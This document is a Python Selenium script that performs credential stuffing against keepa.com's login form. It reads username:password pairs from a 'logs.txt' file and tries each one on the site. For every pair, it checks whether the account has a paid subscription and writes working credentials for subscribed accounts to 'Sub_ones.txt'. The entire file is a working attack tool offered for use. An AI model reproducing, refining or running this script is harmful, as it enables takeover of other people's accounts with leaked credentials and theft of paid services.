from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options




chrom = webdriver.ChromeOptions()
#chrom.add_argument("no-sandbox")
#chrom.add_argument("--disable-gpu")
#chrom.add_argument("--window-size=800,600")
#chrom.add_argument("--disable-dev-shm-usage")
#chrom.add_argument('--headless')
#chrom.add_argument("--disable-xss-auditor")
#chrom.add_argument("--disable-web-security")
#chrom.add_argument("--allow-running-insecure-content")
#chrom.add_argument("--no-sandbox")
#chrom.add_argument("--disable-setuid-sandbox")
#chrom.add_argument("--disable-webgl")
#chrom.add_argument("--disable-popup-blocking")


# initialize Chrome
driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
# open website
website_1 = "https://keepa.com/#!settings/1"
driver.get(website_1)

# action


driver.maximize_window() # For maximizing window
driver.implicitly_wait(5) # gives an implicit wait for 20 seconds
    
#[login_option = driver.find_element(By.ID,value="panelUserRegisterLogin")
# I import the passwrds and usernames
f= open("logs.txt","r",encoding="utf-8")
cout = 0
total_login = 0
for line in f:
    # Checking passwords why by bone a is username and b is password
    fields = line.split(":")
    a = fields[0]
    b = fields[1]
    user_name = driver.find_element(By.XPATH, value="//input[@id='username']")
    user_name.click()
    user_name.send_keys(a)
# The Password Options
    passwd = driver.find_element(By.XPATH, value="//input[@id='password']")
    passwd.click()
    passwd.send_keys(b)
    # Submit button
    submit_buton = driver.find_element(By.XPATH, value="//input[@id='submitLogin']") 
    submit_buton.click()
    error_login = driver.find_element(By.XPATH,value="//div[@id='loginError']") 
    try:
        cout += 1
        try:
            # if this popup get up then do this
            subs = driver.find_element(By.XPATH,value="//span[normalize-space()='Payment method:']")
            print("----------------------------")
            print("Subsction",cout)
            print(a)
            print(b)
            print("___________________________")
            total_login += 1
            with open("Sub_ones.txt","a") as ff:
                ff.writelines(f"Username:{a} ,Password:{b} ,Total Login{total_login}")
                ff.close()
            login_out = driver.find_element(By.XPATH, value="//span[@id='panelUsername']")
            login_out.click()
            gg = driver.find_element(By.XPATH,value="//div[@id='UMElogout']")
            gg.click()
        except:
            print("Not  Subprictions",cout)
            try:
                pop = driver.find_element(By.XPATH,value="//input[@id='resendVerify']")
                if pop.is_displayed:
                    clo = driver.find_element(By.XPATH,value="//div[@id='shareChartOverlay-close']//i[@class='fa fa-times-circle fa-2x']")
                    clo.click()
            except:
                pass
            login_out = driver.find_element(By.XPATH, value="//span[@id='panelUsername']")
            login_out.click()
            gg = driver.find_element(By.XPATH,value="//div[@id='UMElogout']")
            gg.click()
    except:
        canl = driver.find_element(By.XPATH, value="//div[@id='loginOverlay-close']//i[@class='fa fa-times-circle fa-2x']")
        canl.click()
        login_option = driver.find_element(By.XPATH, value="//div[@id='userMenuPanel']")
        login_option.click()
        user_name = driver.find_element(By.XPATH, value="//input[@id='username']")
        user_name.click()
        user_name.clear()
# The Password Options
        passwd = driver.find_element(By.XPATH, value="//input[@id='password']")
        passwd.click()
        passwd.clear()
    
print("Done")
driver.close()
        #login_out = driver.find_element(By.XPATH, value="//span[@id='panelUsername']")
     #login_out.click()
    #gg = driver.find_element(By.XPATH,value="//div[@id='UMElogout']")
    #gg.click()